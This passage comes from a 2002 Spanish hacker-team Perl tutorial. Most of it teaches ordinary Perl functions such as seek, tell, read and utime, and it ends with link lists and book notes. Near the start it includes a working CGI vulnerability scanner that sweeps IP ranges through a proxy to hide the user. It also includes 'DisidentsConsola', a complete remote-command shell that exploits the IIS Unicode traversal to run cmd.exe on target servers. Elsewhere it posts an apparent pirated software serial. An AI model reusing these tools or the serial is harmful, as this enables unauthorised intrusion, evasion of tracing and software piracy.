# URL:      http:www.disidents.int-ltd.com                                                                                             #
# MAILTEAM: Disisidents@yahoo.es                                                                                                       #
# Sintaxis: disidentscgiscanrvp.pl [ip de inicio] [ip final] [lista cgis] [+v|-v] (ver todas las respuestas o no) [ip del proxy:puerto]#
# Example:  ./disidentscgiscanrvp.pl 255.255.255.255 255.255.255.255 listacgis.txt +v -p 255.255.255.255:80                            #
########################################################################################################################################
use LWP::Simple;
use LWP::UserAgent;


die "sintaxis: $0 [ip de inicio] [ip final] [lista cgis] [+v|-v] [-p ip del proxy:puerto]
Escriba $0 --help para ver la ayuda\n" unless ($ARGV[0]);

if ($ARGV[0] eq "--help"){
                          &ayuda;
                         } else {





$ip1=$ARGV[0];   #Un argumento para  host o ip del server
$ip2=$ARGV[1];
require $ARGV[2];
$verbose=$ARGV[3];
if ($ARGV[4] eq "-p") { $proxy="$ARGV[5]";
                         die "Falta por introducir el proxy y su puerto\n" unless ($ARGV[5]);
                      }

print " ###################################################################### \n";
print " #    øøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøø  # \n";
print " #    ø   DisidentsCGIScanner Range v.1.2 Proxy Version by DDiego  ø  # \n";
print " #    øøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøø  # \n";
print " ###################################################################### \n\n";

 @ipini = split(/\./,$ip1);#sustituye el punto por espacios
 @ipfin = split(/\./,$ip2);#sustituye el punto por espacios



                if ($ipini[3]>255 | $ipfin[3]>255){
                                                     print "El rango de ips tiene que estar entre 1 y 255 $ipfin no es posible\n";
                                                     exit;
                                                  }
                elsif ($ipini[3]>$ipfin[3]) {
                                              print "La ip de inicio no puede ser mayor que la ip final introduzca bien los parametros\n";
                                              exit;
                                            }


        print "Escaneando CGIS\n";
        #$proxy="$ARGV[2]";



for ($rango=$ipini[3];$rango<=$ipfin[3];$rango++) {

        $ipscan="$ipini[0].$ipini[1].$ipini[2].$rango"; #preparamos las ip


        $urlcgi="http://$ipscan";
        $ua = LWP::UserAgent->new();
        $ua->agent('Disidents navigator'); #Tipo de navegador que usamos
        if ($ARGV[5]) { &proxyop }
        $request = HTTP::Request->new('HEAD', $urlcgi);
        $response = $ua->request($request);

        if ($response->code == 500) {
                                     print "$urlcgi NO se ha  encontrado servidor httpd activo\n";
                                    }

        elsif ($verbose eq "+v")  {
                                  &vertodo;
                                }

        elsif($verbose eq "-v")   {
                                  &vervulnerables;
                                }
        sub vertodo {
                        foreach $cgi (@cgis) {
                        $urlcgi="http://$ipscan/$cgi";
                        $ua = LWP::UserAgent->new();
                        $ua->agent('Disidents navigator');
                        if ($ARGV[5]) { &proxyop }
                        $request = HTTP::Request->new('HEAD', $urlcgi);
                        $response = $ua->request($request);
                        if ($response->code == 200) {
                                                     print "$urlcgi    OK\n";
                                                    }
                        else { print "$urlcgi NOT\n";}
                        }

                                              }

        sub vervulnerables {
                                foreach $cgi (@cgis) {
                                $urlcgi="http://$ipscan/$cgi";
                                $ua = LWP::UserAgent->new();
                                $ua->agent('Disidents navigator');
                                if ($ARGV[5]) { &proxyop }
                                $request = HTTP::Request->new('HEAD', $urlcgi);
                                $response = $ua->request($request);
                                if ($response->code == 200) {
                                                             print "$urlcgi    OK  \n";
                                                            }

                                                     }



        sub servidor {
                         $urlformada="http://$ipscan"; #Aqui no usamos proxy pero tampoco hacemos nada malo
                        ($content_type, $document_length, $modified_time, $expires, $server) = head($urlformada);
                        print "TIPO DE SERVIDOR: $server\n\n";
                     }

        sub proxyop  {
                         $ua->proxy(['http'], "http://$proxy"); #a protegernos el culo
                     }


        print "Escaneo finalizado\n\n\n";
        }
       }
      }


 #####################
 # Parte de la ayuda #
 #####################

 sub ayuda {
            print "[ip de inicio]:         Host o ip de inicio para escanear sin las http \n";
            print "[ip final]:             Host o ip de inicio para escanear sin las http \n";
            print "[lista cgis]:           listascgis.txt, puedes incluir mas cgis a tu gusto\n";
            print "[+v|-v]:                Modo verbose, imprime todos los resultados ya sean fallidos o no con +v\n";
            print "                        que encuentre vulnerables\n";
            print "[-p ip del proxy:puerto]:  Proxy y puerto sin las http, tipo -p 255.255.255.255:80, si no se va a\n";
            print "[-p ip del proxy:puerto]:  Usar la opcion de proxy simplemente no se ignoaran esos argumentos\n";
            print "Ejemplo usando proxy:    ./disidentscgiscanvp.pl 192.168.0.1 192.168.0.100 listacgis.txt +v -p 255.255.255.255:80\n";
            print "Ejemplo sin usar proxy:  ./disidentscgiscanvp.pl 192.168.0.1 192.168.0.100 listacgis.txt +v\n\n\n";
           }

print "                                       ----------------------------------------------\n";
print "                                       - Disidents Hacker Team - 2002               -\n";
print "                                       - Webpage:  http://www.disidents.int-ltd.com -\n";
print "                                       - Autor:    DDiego                           -\n";
print "                                       - Mail:     DDiegodisid\@yahoo.es            -\n";
print "                                       - Mailteam: Disidents\@yahoo.es              -\n";
print "                                       ----------------------------------------------\n";





  <-->












.==========================================================================.
|====~ 41.0.0 QUEEEE QUE EN LA CONSOLA DE CGIS TAMBIEN QUIERES USAR PROXY ~=
|===========================================================================


- No hay problema, con el modulo LWP::UserAgent tambien se pueden hacer get,
  y imprimir la pagina jaja veamos un poco mas de code:


  use LWP::UserAgent;
  $proxy="255.255.255.255"; #ip del proxy que quieras
  my $ua = new LWP::UserAgent;
  $ua->proxy(['http'], "http://$proxy"); #nuestra linea preferida
  my $req = new HTTP::Request('GET', 'http://127.0.0.1/index.html');
  my $res = $ua->request($req);
  print $res->code."\n";   #imprimira 200 , este ya lo vimos
  print $res->message."\n";#imprimira OK de que ha encontrado la pagina
  print $res->content."\n";#imprimira el contenido de la web,ajaja esto nos interesa


* Veamos como quedaria el programa "completo",  va  es un poco  apañao  pero
  bueno jaja vale pa echar el rato ;):




 <++> disidentsconsolavp.pl


#!/usr/bin/perl
################################################################################
# PROGRAMA: DisidentsConsola v.1.1 Proxy Version                               #
# AUTOR:    DDiego                                                             #
# MAIL:     DDiegodisid@yahoo.es                                               #
# URL:      http:www.disidents.int-ltd.com                                     #
# MAILTEAM: Disisidents@yahoo.es                                               #
# Sintaxis: disidentsconsolavp.pl [ip/host del servidor] [ip del proxy:puerto] #
################################################################################
use LWP::Simple;
die "sintaxis: $0 [ip/host del servidor] [ip del proxy:puerto]\n" unless ($ARGV[1]);
$url=$ARGV[0];   #Un argumento para la linea de comandos host o ip del server
$proxy=$ARGV[1];
print " ############################################################# \n";
print " #    øøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøø  # \n";
print " #    ø   DisidentsConsola v.1.1 Proxy Version by DDiego  ø  # \n";
print " #    øøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøø  # \n";
print " ############################################################# \n";

while (1) {
print "Disidentsconsola: ";
$comando= <STDIN>;
chop $comando;     #Quita el enter

if ($comando =~ s/ /+/g) #Sustituye los espacios por +
                       {

                        $cgi="scripts/..%c1%1c../winnt/system32/cmd.exe?/c+$comando";#este cgi clasico unicode se puede cambiar ;)
                        $urlcgi="http://$url/$cgi";
                        use LWP::UserAgent;
                        my $ua = new LWP::UserAgent;
                        $ua->agent('Disidents console');
                        $ua->proxy(['http'], "http://$proxy");
                        my $req = new HTTP::Request('GET', $urlcgi);
                        my $res = $ua->request($req);
                        print $res->code."\n";
                        print $res->message."\n";
                        print $res->content."\n";

                       }

else { print "El comando introducido no es correcto\n";}



           }


<-->














.==========================================================================.
|=======~ 42.0.0 __DATA__ Y __END__ ~=======================================
|===========================================================================


- Para que sirven, pues veamos un par de ejemplos comentados:


  Ejemplo:

   #!/usr/bin/perl
   $salida =  <DATA>;
   print "$salida\n";
   __DATA__
   Esto imprimira en pantalla



  SALIDA:

   Esto imprimira en pantalla





  Ejemplo:

   #!/usr/bin/perl
   $salida =  <DATA>;
   print "$salida\n";
   __END__
   Esto imprimira en pantalla



  SALIDA:

   Esto imprimira en pantalla




- Como podemos observar con el manejador data imprime,el texto que esta des-
  pues de __DATA__ o de __END__ .







.==========================================================================.
|=======~ 43.0.0 DEFINED ~==================================================
|===========================================================================


- Con defined pordemos saber si un elemento ha sido definido o no, si ha sid
  o definido devuelve un 1 si no un 0.



  Ejemplo:

   #!/usr/bin/perl
   @array = (damicita,vanmore,w3ndig0,rootzero);
   if(defined($array[4]))
                      {
                        print "Hay cinco en el array\n";
                      }
                      else { print "no hay cinco en el array\n";  }


  SALIDA:

   [root@localhost articulo]# perl defined.pl
   no hay cinco en el array







.==========================================================================.
|=======~ 44.0.0 READ Y SYSREAD LEYENDO UNOS BYTES ~========================
|===========================================================================


- Gracias a read podemos leer los bytes de un archivo que queramos por ej he
  creado el texto disidents.txt que contiente el texto DISIDENTS HACKER TEAM
  , este archivo ocupa 23 bytes dos de los cuales  imnecesarios, podemos ver
  el archivo con un editor hexadecimal ver porque y eliminar  los bytes  que
  no  necesitamos  o usar truncate mirad +  arriba ;), veamos  como funciona
  read:


  Ejemplo:

   #!/usr/bin/perl
   open (ARCHIVO,'disidents.txt') or die ("no se ha podido encontrar el archivo");
   read(ARCHIVO, $salida,19); #leemos 19 bytes
   close(ARCHIVO);
   open (ARCHIVO,'disidents.txt') or die ("no se ha podido encontrar el archivo");
   read(ARCHIVO, $salida2,20);#leemos 20 bytes
   close(ARCHIVO);
   open (ARCHIVO,'disidents.txt') or die ("no se ha podido encontrar el archivo");
   read(ARCHIVO, $salida3,21);#leemos 21 bytes
   close(ARCHIVO);
   print "$salida\n";
   print "$salida2\n";
   print "$salida3\n"; #Aqui saldra la frase completa




  SALIDA:

   [root@localhost articulo]# perl read.pl
   DISIDENTS HACKER TE
   DISIDENTS HACKER TEA
   DISIDENTS HACKER TEAM

- Ahora veamos con sysread, con sysread simplente utilizamos la funcion read
  del sistema:



  Ejemplo:
   #!/usr/bin/perl
   open (ARCHIVO,"disidents.txt") or die ("no se ha podido encontrar el archivo");
   sysread(ARCHIVO, $salida, 21);
   print "$salida\n";


  SALIDA:

   [root@localhost articulo]# perl sysread.pl
   DISIDENTS HACKER TEAM








.==========================================================================.
|=======~ 45.0.0  SYSWRITE ESCRIBIENDO UNOS BYTES ~=========================
|===========================================================================


- Umm ahora que necesitamos escribir en un archivo, veamos como ;):


 SINTAXIS: sysread FILEHANDLE, SCALAR, LENGTH


  Ejemplo:

   #!/usr/bin/perl
   open (ARCHIVO,">disidents.txt") or die ("no se ha podido encontrar el archivo"); #Abrimos el archivo en modo escritura
   syswrite(ARCHIVO, "DISIDENTS HACKER TEAM", 21); #se puede especificar el numero de bits a añadir




* Otra forma bonita:

  Ejemplo:

   #!/usr/bin/perl
   $cadena="DISIDENTS HACKER TEAM";
   open (ARCHIVO,">disidents.txt") or die ("no se ha podido encontrar el archivo");
   syswrite(ARCHIVO, $cadena, length($cadena));


- o sin especificar :

   syswrite(ARCHIVO, $cadena);



* jeje hemos añadido el texto, pero imaginemos que queremos añadirlo en otra
  parte del archivo ;)

   SINTAXIS: sysread FILEHANDLE, SCALAR, LENGTH, OFFSET











.==========================================================================.
|=======~ 46.0.0 SYSSEEK Y SEEK ~===========================================
|===========================================================================


- Ahora supongamos que queremos abrir un archivo, y  empezar a leer a partir
  de una determinada posicion, para  ello usaremos seek.


  Ejemplo:

   #!/usr/bin/perl
   open (ARCHIVO,'disidents.txt') or die ("no se ha podido encontrar el archivo");
   seek(ARCHIVO, 19,0); #leemos a partir de los 19 primeros bytes respecto al inicio del archivo

* Si pusieramos:

  seek(ARCHIVO, 19,1); #leemos a partir de los 19 primeros bytes respecto  a
                       #la posicion actual

  seek(ARCHIVO, 19,2); #leemos a partir de los 19 primeros bytes respecto al
                       #final del archivo

- O tambien se pueden usar las constantes SEEK_CUR, SEEK_SET O SEEK_END


* Si pusieramos:

  seek(ARCHIVO, -19,SEEK_END);

- Estariamos posicionados a 19 bytes del final del archivo


* sysseek se usa de la misma manera.








.==========================================================================.
|=======~ 47.0.0 TELL & TELLDIR ~===========================================
|===========================================================================


- Gracias a "tell" podemos saber la posicion en bytes actual ya sea desde el
  principio de un archivo la posicion actual o final, para ello comprendere-
  mos un poco mas como se usa seek ;).


  SINTASIX: seek (FILEHANDLE)


  Ejemplo:

   #!/usr/bin/perl
   open (ARCHIVO,"disidents.txt") or die ("no se ha podido encontrar el archivo");
   while(<ARCHIVO>){
                    $posicion1=tell(ARCHIVO);
                    print "Posicion de inicio $posicion1\n";  #como lee desde el principio solo lee 21 y los imprime
                    seek(ARCHIVO, 25,0);  #nos posicionamos desde el inicio  25 bytes
                    $posicion2=tell(ARCHIVO);
                    print "Posicion dos $posicion2\n";
                    seek(ARCHIVO, 5,1); #nos posicionamos desdela posicion actual 5 caracteres osea llegara a 30 bytes
                    $posicion3=tell(ARCHIVO);
                    print "Posicion tres $posicion3\n";
                   }



  SALIDA:

   [root@localhost articulo]# perl  prueba.pl
   Posicion de inicio 21
   Posicion dos 25
   Posicion tres 30


- Con telldir devuelve una posicion numerica en el directorio, osea nos pre-
  senta nuestra ubicacion dentro de los directorios:


  Ejemplo:

   #!/usr/bin/perl
   opendir (DIRECTORIO,".") or die ("no se ha podido encontrar el archivo");

   while ($archivo = readdir (DIRECTORIO))   #ahora lee DIRECTORIO y lo mete en $salida
                                        {
                                         $ubicacion=telldir (DIRECTORIO);
                                         print "Archivo: $archivo Ubicacion: $ubicacion\n";
                                        }


  SALIDA:

   [root@localhost articulo]# perl  telldir.pl
   Estamos en . 12
   Estamos en .. 24
   Estamos en prueba.pl 44
   Estamos en tuto 56









.==========================================================================.
|=======~ 48.0.0 RETURN ~===================================================
|===========================================================================


- Return se usa para devolver un valor y se utiliza solo en subrutinas o con
  eval, veamos un ejemplo:


  Ejemplo:

   #!/usr/bin/perl
   print "Introduzca su nombre: ";
   chop ($nombre=(<STDIN>));
   print "Introduzca su team: ";
   chop ($team=(<STDIN>));

   print "Eres " .&resultado.  "\n";
   sub resultado {
                  $salida="$nombre de $team";

                  return($salida); #devuelve  la salida e imprimira en pantalla
                 }


  SALIDA:

   [root@localhost articulo]# perl return.pl
   Introduzca su nombre: DDiego
   Introduzca su team: Disidents
   Eres DDiego de Disidents







.==========================================================================.
|=======~ 49.0.0 SELECT ~===================================================
|===========================================================================


- La funcion select nos puede servir para realizar operaciones por defecto,a
  la hora de usar un manejador como puede ser un archivo, veamos un ejemplo:


  Ejemplo:

   #!/usr/bin/perl
   open (ARCHIVO,'>disidents.txt') or die ("no se ha podido encontrar el archivo");
   select (ARCHIVO);
   print "DISIDENTS HACKER TEAM\n"; #Lo guaadara en disidents.txt











.==========================================================================.
|=======~ 50.0.0 STUDY ~====================================================
|===========================================================================


- Existen mas formas de buscar texto para ello usaremos la funcion study:


  Ejemplo:

   #!/usr/bin/perl
   open (ARCHIVO,"disidents.txt") or die ("no se ha podido encontrar el archivo");
   while (<ARCHIVO>) {
                      study($_); #A buscar
                             if ($_ =~ "DISIDENTS"){ #Si esta dentro la palabra DISIDENTS
                                                    print "DISIDENTS ESTA DENTRO\n"; #Imprime esto
                                                   }

                              else {   #Si no esta dentro
                                     print "DISIDENTS NO ESTA DENTRO\n";  #Imprime esto
                                   }
                     }











.==========================================================================.
|=======~ 51.0.0 TIME ~=====================================================
|===========================================================================


- La  funcion "time" simplemente nos indica el nº de segundos que han pasado
  desde el 1 de Enero de 1970, en plataformas MacOS desde el 1 de  Enero  de
  1904, para que vale yo creo que para nada xDD aparte de usar utime:

  Ejemplo:

   #!/usr/bin/perl
   $segundos= time;
   print "segundos\n";






.==========================================================================.
|=======~ 52.0.0 UTIME ~====================================================
|===========================================================================


- utime sirve para cambiar la ultima fecha de acceso y y modificacion de  un
  archivo.


  SINTAXIS: utime ATIME MTIME

   ATIME= fecha de utlimo acceso
   MTIME= fecha de modificacion

- Para la fecha se usa time, va en segundos, veamos como funciona:


  Ejemplo:

   #!/usr/bin/perl
   $mihora= time;  #tiempo transcurrido en segundos desde 1970
   @ficheros=("disidents.txt","pepe.txt"); #ficheros que voy a modificar
   utime  $mihora, $mihora, @ficheros; # le ponemos el mismo tiempo







.==========================================================================.
|=======~ 53.0.0 REPITIENDO CON x ~=========================================
|===========================================================================


- Gracias a x podemos repetir facilmente una cadena, es asi de facil:


  Ejemplo:

   #!/usr/bin/perl
   $texto="DISIDENTS HACKER TEAM";
   print ($texto x 10);









.==========================================================================.
|=======~ 54.0.0 PERL2EXE ~=================================================
|===========================================================================


- Para quienes quieren pasar su script a exe de forma rapida,aunque sin sen-
  tido teniendo un interprete, ya que crea un exe de un tamaño grandisimo e-
  xiste este programa el perl2exe, podeis bajarlo de: (http://www.indigostar
  .com/perl2exe.htm), esto he encontrao por ahi por la red no lo he probado:
  -> Logo Master v3.0 - Type perl2exe -register - Serial - ExEd! [Dsi],20527

  suena a serial ehh jeje







.==========================================================================.
|=======~ 55.0.0 LINKS INTERESANTES ~=======================================
|===========================================================================


---[ FOROS DE DISCURSION:

    Foro de Disidents ;)          : http://www.melodysoft.com/cgi-bin/foro.cgi?ID=disidents
    Foro de la web del programador: http://www.lawebdelprogramador.com/news/new.php?id=70&texto=Perl
    Foro en google                : http://groups.google.com/groups?hl=es&group=comp.lang.perl.misc
    Foro en google                : http://groups.google.com/groups?hl=es&group=es.comp.infosistemas.www
    Foro webmasters               : http://www.forowebmasters.com
    Grupo usenet:                 : news:comp.lang.perl


---[ DIRECCIONES INTERESANTES


   -[ CASTELLANO ]-

     Scripts de seguridad en Perl : http://www.gwolf.cx/seguridad/script_seg_perl/index.php3
     Perl Mongers Madrid          : http://madrid.pm.org/
     La Web de Programador        : http://www.lawebdelprogramador.com
     Aula Digital                 : http://www.auladigital.com/aula.php3?action=category&category=2
     Tutoriales owen.fompi.com    : http://owen.fompi.com/tutoriales/perl/spanish/
     Perl 5.0 un lenguaje multiuso: http://www.iespana.es/perl-es/
     Introduccion al Lenguaje Perl: http://www.geocities.com/SunsetStrip/Backstage/6023/CGI_perl_01.html
     Seguridad perl               : http://www.linuxfocus.org/Castellano/November2001/article203.shtml
     Escribiendo scripts CGI      : http://jmarshall.com/easy/cgi/spanish/
     Tutorial de Perl             : http://www.eui.upm.es/CC/Chuletas/Perl/
     Perl LimpiaWebs              : http://members.es.tripod.de/asualam/perl/
     Tutorial de PERL en español  : http://granavenida.com/perl/
     Manuales GGR SOFTWARE.COM    : http://www.cgrsoftware.com/manuales_dir?perl_1
     El evangelio de Perl         : http://epq.com.co/~cjara/pd4270.cgi?perl/tutorial.html
     Tutorial de perl             : http://www.arrakis.es/~karlos_/manual/perl.html
     Universidad de Costa Rica    : http://anubis.ecci.ucr.ac.cr/~ci1402/p/1998-08.htm
     Recursos de perl             : http://dmoz.org/World/Español/Computadoras/Programación/Lenguajes/Perl/
     El CGI Hecho Realmente Fácil : http://www.jmarshall.com/easy/cgi/spanish/cgi_footnotes.html
     Tk Documentation             : http://w4.lns.cornell.edu/~pvhp/ptk/doc/
     www.abcdatos.com             : http://www.abcdatos.com/tutoriales/perl.html
     WEBADMIN. CURSO 00/01        : http://webadmin.dsic.upv.es/webadmin/prac6/
     Curso sobre programación Perl: http://cdec.unican.es/soporte/cursos/perl/Default.htm
     Proyecto de Tutorial de Perl : http://proton.ucting.udg.mx/tutorial/perl/tutorial_perl.html
     www.lpis.com                 : http://www.lpis.com/ayudas/perl.html
     Varios tutoriales            : http://edu.kipelhouse.com/Aula_Virtual/Apuntes/Internet/Perl/
     Archivos en perl             : http://www.geocities.com/SiliconValley/Park/3060/archivos.html
     Universidad de Oviedo        : http://www.etsimo.uniovi.es/links/perl.html



   -[   INGLES   ]-


     CGI Programming on the www   : http://www.oreilly.com/openbook/cgi/index/idx_s.html <- libro online
     Network programming in Perl  : http://www.1024kb.net/texts/perlnet.html
     Perlopentut:                 : http://www.xav.com/perl/lib/Pod/perlopentut.html
     CPAN                         : http://www.cpan.org
     www.68K.org                  : http://68k.org/~interiot/obscure/oreilly.html
     Perl documentation           : http://www.perldoc.com/
     www.perldoc.com              : http://www.perldoc.com
     www.perl.com                 : http://www.perl.com/pub/q/documentation
     www.perl.com                 : http://www.perl.com/pub/q/faqs
     Manuales para bajar          : http://www.gorkhali.com/kamal/download.htm#17
     Robert's Perl Tutorial       : http://www.netcat.co.uk/rob/perl/win32perltut.html
     Recursos de  perl            : http://dmoz.org/Computers/Programming/Languages/Perl/
     www.perl.org                 : http://www.perl.org/
     The Perl Jobs Site           : http://jobs.perl.org/
     The Perl Journal             : http://www.tpj.com/
     Perl faq index               : http://www.faqs.org/faqs/perl-faq/
     Perl Paraphernalia           : http://perl.plover.com/
     Packetstorm Programming tuto : http://packetstorm.mirror.widexs.nl/programming-tutorials/Perl/
     code.box.sk                  : http://code.box.sk/subject.php?subject=Perl


   -[    CODE    ]-


      DACHB0DEN LABS              : http://www.dachb0den.com/archives/tools.html
      r00tabega                   : http://www.r00tabega.org/   - thks taseh por la dire ;)
      Online Programmer Ezine     : http://www.onlineprogrammer.org/
      Slashdot                    : http://slashdot.org/code.shtml
      Blackcode                   : http://www.blackcode.com
      Sourcewell                  : http://sourcewell.berlios.de










.==========================================================================.
|=======~ 56.0.0 LIBROS RECOMENDADOS ~======================================
|===========================================================================


- Los libros estan bien para consultar, pero cuestan una pasta de la hostia,
  yo conozco 4 libros en particular:




   - Titulo: Manual de referencia PERL
     Autor:Martin C. Brown
     Editorial: McGraw-Hill
     Nº de hojas:1169
     Nivel: Intermedio/Avanzado
     Valoracion: Un libro muy pontente pero muy caro 9.900 pts jaja si que esta valorado


   - Titulo: Guia de referencia para  programadores de perl 5 (The Perl Programmer's Reference)
     Autores: R. Allen Wyke y Luke Duncan
     Nº de hojas: 451
     Nivel: Intermedio
     Valoracion: Mejor el anterior, pero no esta mal te puede aclarar ideas
     Precio:4.200 pts

   - Titulo: Network Programming with Perl
     Autor:  Lincoln D. Stein
     Publisher: Addison Wesley
     Format: Paper, 784 pp
     ISBN: 0-201-61571-1
     Status: Published 12/29/2000
     Valoracion: Dicen que es bueno pero esta en ingles, umm que tentancion comprarlo
     Precio: $44.95 US
     Una web guapa:  http://modperl.com:9000/perl_networking/


   - Titulo: Guia esencial Perl 5
     Autores: Micah Brown , Crhis Bellew, Dan Livingston
     Nº de hojas: 206
     Nivel:Principiante
     Valoracion: Una pequeña guia interesante para programadores web, que quieren algo rapido
     y facil
     Precio: 1.496 pts


 NOTA: Me quedo con el primero ;) y el 3º dan ganas, para cuando me toque la loteria









.==========================================================================.
|=======~ 57.0.0 NOTAS FINALES ~============================================
|===========================================================================


- Ummm en la proxima edicion espero tratar mucho mas a fondo la programacion
  en perl, sacar nuevos programas y mejorar los ya realizados,  no se cuando
  la sacare o si podra tener el tamaño y la calidad de esta pero lo intenta-
  re, estoy viciado ;),  espero que os haya gustado y os haya servido al me-
  nos de introduccion a la programacion,  si habeis escrito algun programa o
  algo y quereis que se incluya en el siguiente capitulo comentado etc... ya
  sabeis al mail disidents@yahoo.es, y lo incluiremos  en la web tambien sin
  ningun problema, todos las herramientas se encuentran en la pagina web  de
  disidents en la seccion de  herramientas, tenemos copyright  xDD, pero  si
  alguno de vosotros quiere incluir algun programa,  o el texto  en  vuestra
  pagina web no hay ningun problema siempre que se  haga referencia al autor
  y al  grupo a quien pertenece.







.==========================================================================.
|=======~ 58.0.0 SALUDOS ~==================================================
|===========================================================================


- Ya se acabo el trabajo de  unos cuantos meses, necesito un descanssssooooo,
  venga este articulo va dedicado aaaaaa  Taseh,  W3ndig0, N0rth, Rah3, X4B1,
  S-P-A-R-K, leon01, rootzero, Vanmore, remains, damicita, wendell,  {FEAR} ,
  ADAROTH, charchi, ^[LoW]^, Genl0g,  bockvan,  Shadows_T,  T0wanda, AsHiRa-,
  LLoKKa,  NaNo-mAn, ourkito, {^JaB3^}, Sisq0, Estxellon, Gibdeon, ^Garlick^,
  _0rAk00L_, Nakao, _Azec]{_, d0b3rman, C0ven, ^jan, bad^boy, mi-6, {V|S|oN},
  Vuur-Burn,  X-CRoMe,  wylli, Randomlog,  Crypto , SirCandy,  ScRool,  hdi4,
  ZiltrOcs, ]DYD[, pinorrana, Quade2K, charchi, XhAp|nCo, Crash_18, [NeTrOh],
  elreviron, kl0nk, ZeRo-DivI, AlI10s, mindlock, Lecter, mitr3in, XanKaiSen
  madbiker, maniac y ASzY.

  Diossssss espero no olvidarme de nadie, ahhh y los chicos de antiguo y muy
  ilustre  canal #undergr0und en terra  namx,  Gerardx and company, yo nunca
  olvido a los amigos ;)






.==========================================================================.
|=======~ 59.0.0 CONTACTO ~=================================================
|===========================================================================


 - Pues es facil localizarme,que tenga tiempo para hablar dificil sobre todo
   por semana:





.====[ Contacta conmigo o con el team ]====================================.
|                                                                          |
| ===[ MI MAIL ]====================== ===================[ MAIL TEAM ]=== |
| =            Diegorba@yahoo.es     = = Disidents@yahoo.es              = |
| =                                  = =                                 = |
| ===================================== ================================== |
| =====[ w3BpaG3s ]==================== =================[ Irc Servers ]== |
| = http://www.disidents.int-ltd.com  = = irc.telecable.es  6667         = |
| = http://www.galeon.com/disidensweb = = irc.linux.org     6667         = |
| ===================================== =====[ Channels ]=               = |
| =  EL HACKER NOBLE - DISIDENTS        =[ #disidents #codex #el3ktro    = |
| =  DATE: 23-02-2002                   =[ #seguridad_redes              = |
| ======================================================================== |
|                                                                          |
`===================================[ Contacta conmigo o con el team ]====='

                                                =~ El chico de las dos D ~=
                                      _
                                    (   )
                                      ~
                                      ~
                                      ~
                                      ~
                                      ~
                                      ~
                               |=============|
                               |=============|
                                    | | |
                                    | | |
                                    | | |
                                    | | |
                                    | | |
                                    | | |
                                    | | |
                                    | | |
                                    | | |
                                    | | |
                                    | | |
                                    | | |
                                    | | |
                                    | | |
                                    | | |
                                    | | |
                                    | | |
                                    | | |
                                    | | |
                                    | | |
                                    | | |
                                    | | |
                                    \ | /
                                     \|/
                                      '
